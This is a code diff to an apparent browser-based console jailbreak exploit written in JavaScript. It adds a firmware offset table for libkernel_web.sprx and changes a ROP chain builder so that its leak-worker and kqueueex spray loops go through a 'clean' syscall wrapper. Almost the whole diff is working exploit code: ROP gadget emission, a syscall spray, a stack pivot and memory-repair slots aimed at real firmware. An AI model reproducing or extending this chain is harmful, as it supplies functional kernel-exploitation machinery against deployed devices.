@@ -57,6 +57,41 @@
 
         const LEAK_CORES = [0, 1, 2, 3];
 
+        // Decrypted libkernel_web.sprx offset registry for high-frequency clean leak loop.
+        // If your firmware is missing, extract & contribute offsets using this utility:
+        // https://github.com/bizkut/libkernel_web_offset_finder
+        const LIBKERNEL_SPRX_OFFSETS = {
+            "11.60": {
+                CLEAN_SYSCALL_WRAPPER: 0x1A8D7n,
+                KQUEUEEX_WRAPPER:      0x1BDD0n,
+                GETTIMEOFDAY:          0x1D150n,
+            }
+        };
+        let current_libkernel_offset = null;
+        function resolve_libkernel_offsets() {
+            let offsets = LIBKERNEL_SPRX_OFFSETS[FW_VERSION];
+            if (!offsets) {
+                let key = FW_VERSION;
+                if (typeof FW_ALIAS_P2JB !== "undefined" && FW_ALIAS_P2JB[key]) {
+                    key = FW_ALIAS_P2JB[key];
+                }
+                offsets = LIBKERNEL_SPRX_OFFSETS[key];
+            }
+            if (!offsets) {
+                const major = FW_VERSION.split(".")[0];
+                offsets = LIBKERNEL_SPRX_OFFSETS[major + ".00"];
+            }
+            current_libkernel_offset = offsets || null;
+        }
+        function libkernel_sprx_addr(off) {
+            if (current_libkernel_offset !== null &&
+                typeof syscall_wrapper !== "undefined") {
+                return syscall_wrapper +
+                    (off - (current_libkernel_offset.GETTIMEOFDAY + 0x7n));
+            }
+            return libkernel_base + off;
+        }
+
         const SYSCALL_EXTRA = {
             recvmsg: 0x1bn,
             socketpair: 0x87n,
@@ -205,6 +240,13 @@
         function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder) {
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
+            const clean_syscall = current_libkernel_offset !== null &&
+                typeof libkernel_base !== "undefined" && libkernel_base !== 0n;
+            const leak_syscall_wrapper = clean_syscall
+                ? libkernel_sprx_addr(current_libkernel_offset.CLEAN_SYSCALL_WRAPPER)
+                : syscall_wrapper;
+            const kqueueex_wrapper = leak_syscall_wrapper;
+
             const STACK_SIZE = 0x4000 + (unroll * 31 + remainder * 6 + 0x200) * 8;
             const buf = malloc(STACK_SIZE);
             for (let k = 0n; k < 0x4000n; k += 8n) write64(buf + k, 0n);
@@ -236,7 +278,7 @@
             emit(ROP.pop_rdi); emit(BigInt(pipe_rfd));
             emit(ROP.pop_rsi); emit(dummybuf);
             emit(ROP.pop_rdx); emit(1n);
-            emit(syscall_wrapper);
+            emit(leak_syscall_wrapper);
             emit(ROP.ret);
 
             const kqBase = [];
@@ -244,7 +286,7 @@
                 kqBase.push(idx);
                 emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
                 emit(ROP.pop_rdi); emit(POC_ARG);
-                emit(syscall_wrapper);
+                emit(kqueueex_wrapper);
                 emit(ROP.ret);
             }
 
@@ -253,22 +295,24 @@
                 emit(ROP.pop_rax); emit(value);
                 emit(ROP.mov_qword_rdi_rax);
             };
-            repairSlot(readBase + 0, ROP.pop_rax);
-            repairSlot(readBase + 1, SYSCALL.read);
-            repairSlot(readBase + 2, ROP.pop_rdi);
-            repairSlot(readBase + 3, BigInt(pipe_rfd));
-            repairSlot(readBase + 4, ROP.pop_rsi);
-            repairSlot(readBase + 5, dummybuf);
-            repairSlot(readBase + 6, ROP.pop_rdx);
-            repairSlot(readBase + 7, 1n);
-            repairSlot(readBase + 8, syscall_wrapper);
-            for (let k = 0; k < unroll; k++) {
-                const b = kqBase[k];
-                repairSlot(b + 0, ROP.pop_rax);
-                repairSlot(b + 1, SYSCALL.kqueueex);
-                repairSlot(b + 2, ROP.pop_rdi);
-                repairSlot(b + 3, POC_ARG);
-                repairSlot(b + 4, syscall_wrapper);
+            if (!clean_syscall) {
+                repairSlot(readBase + 0, ROP.pop_rax);
+                repairSlot(readBase + 1, SYSCALL.read);
+                repairSlot(readBase + 2, ROP.pop_rdi);
+                repairSlot(readBase + 3, BigInt(pipe_rfd));
+                repairSlot(readBase + 4, ROP.pop_rsi);
+                repairSlot(readBase + 5, dummybuf);
+                repairSlot(readBase + 6, ROP.pop_rdx);
+                repairSlot(readBase + 7, 1n);
+                repairSlot(readBase + 8, syscall_wrapper);
+                for (let k = 0; k < unroll; k++) {
+                    const b = kqBase[k];
+                    repairSlot(b + 0, ROP.pop_rax);
+                    repairSlot(b + 1, SYSCALL.kqueueex);
+                    repairSlot(b + 2, ROP.pop_rdi);
+                    repairSlot(b + 3, POC_ARG);
+                    repairSlot(b + 4, syscall_wrapper);
+                }
             }
 
             emit(ROP.pop_rax); emit(1n);
@@ -283,7 +327,7 @@
             for (let k = 0; k < remainder; k++) {
                 emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
                 emit(ROP.pop_rdi); emit(POC_ARG);
-                emit(syscall_wrapper);
+                emit(kqueueex_wrapper);
                 emit(ROP.ret);
             }
             emit(ROP.pop_rax); emit(EXIT_MARK);
@@ -291,7 +335,7 @@
             emit(ROP.mov_qword_rdi_rax);
             emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
             emit(ROP.pop_rdi); emit(0n);
-            emit(syscall_wrapper);
+            emit(leak_syscall_wrapper);
 
             return { entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
         }
@@ -2223,7 +2267,7 @@
         } catch (_) { failcheck_path = null; }
 
         ensure_kernel_offset();
-
+        resolve_libkernel_offsets();
         my_init_threading();
 
         const S = make_state();
